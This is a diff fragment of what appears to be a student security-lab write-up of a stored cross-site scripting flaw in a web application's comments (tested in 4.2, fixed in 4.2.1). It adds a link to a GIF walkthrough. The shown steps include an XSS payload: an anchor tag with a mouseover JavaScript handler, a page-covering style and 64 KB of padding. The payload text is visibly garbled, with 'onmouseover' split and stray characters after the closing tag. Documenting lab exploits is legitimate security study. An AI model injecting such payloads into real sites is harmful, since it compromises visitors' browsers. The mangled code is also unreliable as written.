@@ -11,7 +11,7 @@ Time spent: 12 hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![] https://github.com/aragon0118/Week-7-Best-HACKER/blob/master/XSS%20Week%207.gif
   - [x] Steps to recreate: Commented with the following string and replaced ...[64 KB]... with 65536 A's (characters) 
   <a title='x onmouseovlert(unescape(/BEST%20HACKER/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>er=a
   - [ ] Affected source code:
